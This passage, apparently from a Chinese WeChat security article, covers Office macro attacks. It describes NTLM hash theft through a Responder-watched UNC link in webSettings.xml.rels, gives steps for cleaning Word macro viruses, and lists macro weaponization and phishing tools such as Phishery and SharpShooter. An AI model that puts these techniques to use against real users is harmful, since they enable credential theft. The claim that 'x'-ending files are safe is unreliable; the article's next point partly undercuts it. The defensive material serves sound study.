修改 webSetings.xml.rels 文件，且只有在 Office2010 及之后版本才能利用成功。

简单看了一下文章，就是使用 responder 工具监听，而 webSetings.xml.rels 里的内容指向 responder 监听的 UNC 连接，从而导致 NTLM hash 被窃取。

**八、恢复被宏病毒破坏的文档**
-----------------

对于普通用户来说，清理宏病毒显得麻烦，因为文档被宏病毒感染后（实际上是文档使用的模板文档被感染），使用文档时常常会出现一些异常情况，即使用杀毒软件将所有带毒的文档文件都处理一遍，但是，当重新打开它们时病毒又出现了。

其实，对于宏病毒的清理并不难，下面以删除 Word 宏病毒为例分步骤详细说明：

```
1.退出Word程序，先查看系统盘根目录下是否存在Autoexec.DOT文件，如果存在，而又不知道它是什么时候出现，则将其删除。
2.然后找到Normal.DOT文件，一般位于C:\Documents and Settings\ Administrator\Application Data\Microsoft\Templates目录下，用先前干净的备份将其替换，也可以直接删除，Word不会因为找不到Normal.DOT而拒绝启动，它会自动重新生成一个干净的没有任何外来宏的Noraml.DOT。
3.查看Noraml.DOT所在的目录中是否存在其他模板文件，如果存在且不是自己复制进去的，将其删除。
4.重新启动Word程序，查看Word是否恢复正常了。
5.最后检查宏病毒防护是否被启用了，某些病毒会自动禁用宏病毒防护功能，如果不启用禁用宏功能，Word会很快再次被病毒感染。

```

**九、武器化工具**
-----------

```
1、Generate-Macro 这个脚本可以生成一个包含恶意 VBS 脚本的恶意 Excel 文档，可以指定 payload。
2、MacroShop 使用 Office宏创建有效 Payload，其中用base64混淆字符串。
3、Phishery 可以将 URL 注入到 Office 文档中，在用户打开文档的时候，弹出认证窗口，如果用户在认证框 中输入了自己的用户凭证，那么攻击者就可以获得用户的凭证，这在社工钓鱼中非常有用。
4、wePWNise 生成Office 文档中的 VBA 脚本，VBA 脚本在执行的时候可以自动识别系统，执行对应的 payload。
5、SharpShooter 可创建各种格式的 payload 框架，并且使用随机的密钥进行 RC4 加密。
6、Cobalt Strike 快捷制作钓鱼武器，可制作Office 宏病毒。

```

**十、总结：**
---------

```
1、以 "x"  结尾的文件是比较安全的，例如docx，dotx，除此之外，都是不安全的。因此，如果发邮件时一定要让对方发以x结尾的office文件。
2、攻击者能够采用远程加载的方式来注入，因此docx也可能被远程加载宏模板。
3、想要利用wps来执行宏病毒的概率是非常低的，而office的利用需要配合社工话术来让对方执行宏。

```

参考文档:
-----

```
https://www.yuque.com/guoguoxiaoguozi/igv3ce/gmeuwl
https://www.yuque.com/culin-ubod4/guagkh/se5yhn
https://www.yuque.com/mingxinjianxing-kxc4d/ii2mxs/ye5pxk

```

![](https://mmbiz.qpic.cn/mmbiz/17MiccsGRV0D2LfqIJGaG0SdOrQ3Ebl0BZmSDrMLia8x0UgcCzQDzkNrSuo7FfOQUkMbYHVvNYDtbv4YicqvaQl6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic)

**侵权请私聊公众号删文**

 **热文推荐**  

*   [蓝队应急响应姿势之 Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
    
*   [通过 DNSLOG 回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
    
*   [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
    
*   [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
    
*   [实战 | 通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
    
*   [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
    
*   [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
    
*   [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
    
*   [任意账号密码重置的 6 种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
    
*   [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
    
*   [手把手教你 Linux 提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)
    

****欢迎关注 LemonSec****

**觉得不错点个 **“赞”**、“在看”**